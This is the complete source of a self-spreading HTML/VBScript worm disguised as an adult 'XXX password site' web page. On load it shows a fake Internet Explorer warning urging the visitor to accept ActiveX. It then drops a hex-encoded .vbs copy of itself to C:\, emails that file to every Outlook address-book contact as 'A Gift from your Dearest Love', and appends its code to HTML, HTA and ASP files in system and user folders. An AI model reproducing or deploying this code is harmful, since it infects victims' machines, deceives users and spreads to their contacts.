<Emmanuel>
<html><head><title>Welcome To The Biggest XXX Password Site</title>
<body onLoad="window.status='Emmanuel likes to share you his greatest XXX Password Site'">

<SCRIPT language=VBScript>
On Error Resume Next
msgbox "Please accept the ActiveX",vbinformation,"Internet Explorer ! Warning !"
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
If err.number=429 then
ws.Run javascript:location.reload()
Else

vbsn=""
For vbsname=1 To 8
randomize(timer)
vbsn=vbsn & chr(int(rnd(1)*26)+65)
Next
vbsn=vbsn&".vbs"

htms=document.body.createTextRange.htmltext
Set vbsf=fso.CreateTextFile("C:\"&vbsn,2,True)
vbsf.WriteLine "Set fs=CreateObject(""Scripting.FileSystemObject"")"
vbsf.WriteLine "Set ws=CreateObject(""WScript.Shell"")"
vbsf.Write "htm="""

For i=1 To Len(htms)
e=Mid(htms,i,1)
e=Hex(Asc(e))
If Len(e)=1 Then
e="0"&e
End If
vbsf.Write e
Next

vbsf.Write """"
vbsf.WriteLine ""
vbsf.WriteLine "Set newhtm=fs.CreateTextFile(""C:\Emmanuel4U.htm"",True,2)"
vbsf.WriteLine "newhtm.WriteLine ""<Emmanuel>"""
vbsf.WriteLine "newhtm.WriteLine ""<html><head><title>Welcome To The Biggest XXX Password Site</title>"""
vbsf.WriteLine "newhtm.WriteLine ""<body onLoad=""""window.status='Emmanuel likes to share you his greatest XXX Password Site'"""">"""
vbsf.WriteLine "read="""""
vbsf.WriteLine "For pos=1 To Len(htm) Step 2"
vbsf.WriteLine "read=read " &Chr(38)& " Chr(""" &Chr(38)& "h"""&Chr(38)& " Mid(htm,pos,2))"
vbsf.WriteLine "Next"
vbsf.WriteLine "newhtm.Write read"
vbsf.WriteLine "newhtm.WriteLine ""</body></html>"""
vbsf.WriteLine "newhtm.Close"
vbsf.WriteLine "ws.Run ""C:\Emmanuel4U.htm"""
vbsf.Close

Set win=fso.GetSpecialFolder(0)
Set sys=fso.GetSpecialFolder(1)

Set out=CreateObject("Outlook.Application")
Set map=out.GetNameSpace("MAPI")
For Each adr In map.AddressLists
If adr.AddressEntries <> 0 Then
For addr=1 To adr.Addressentries.Count
Set nadr=adr.AddressEntries(addr)
Set mel=out.CreateItem(0)
mel.To=nadr.Address
mel.Subject="A Gift from your Dearest Love"
mel.Body="This gift is for you (" &left(vbsn,8)& ")."
mel.Attachments.Add("C:\"&vbsn)
mel.Send
Next
End If
Next

infect(win)
infect(sys)
infect(fso.GetSpecialFolder(1))
infect(ws.SpecialFolders("MyDocuments"))
infect(ws.SpecialFolders("Desktop"))
infect(ws.SpecialFolders("Favorites"))
infect(ws.SpecialFolders("Recent"))

If Day(Now())=20 Then
document.write "<font face='Lucida Console' size='2' color=black>If you see this msg, it means that you are a porn addict!! Stop seeing porns!! Masturbation kill your life!! Just a simple Html worm by <br> Emmanuel[Singapore] / Come to Galaxynet IRC - #Easy<br></font>"
Else
document.write "<font face='Lucida Console' size='3' color=black>Porn-Master Emmanuel Loves You!<br>Spread all porns throughtout the world.. stop C/P & Beasts Sites!!<br></font>"
End If

End If

Function infect(doss)
Set FolderObj = FSO.GetFolder(doss)
	Set FO = FolderObj.Files
	For each cible in FO
		ext = lcase(FSO.GetExtensionName(cible.Name))
		if ext="htm" or ext="html" or ext="htz" or ext="hta" or ext="asp"  Then
			Set good = fso.OpenTextFile(cible.path, 1, False)
			if good.readline <> "<Emmanuel>" Then
				good.close()
				Set good = fso.OpenTextFile(cible.path, 1, False)
				htmorg = good.ReadAll()
				good.close()
				Set virus = document.body.createTextRange
				Set good = fso.CreateTextFile(cible.path, True, False)
				good.WriteLine "<emmanuel>"
				good.Write(htmorg)
				good.WriteLine virus.htmltext
				good.Close()
			else
				good.close()
			end if
		end if
	next
End Function

</SCRIPT></body></html>
